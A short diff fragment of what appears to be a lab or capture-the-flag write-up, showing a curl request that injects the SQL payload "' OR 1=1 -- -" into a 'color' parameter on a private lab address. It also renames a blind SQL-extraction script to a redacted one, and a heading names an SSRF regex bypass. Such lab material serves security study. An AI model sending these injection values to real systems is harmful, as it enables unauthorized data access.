@@ -38,7 +38,7 @@ curl -i -G http://10.0.0.40:1336/ \
   --data-urlencode 'stock=0' \
   --data-urlencode "color=' OR 1=1 -- -"
 
-python3 lab2/payloads/sqli_blind_extract.py
+python3 lab2/payloads/sqli_blind_redacted.py
 ```
 
 ## 7. SSRF Regex Bypass
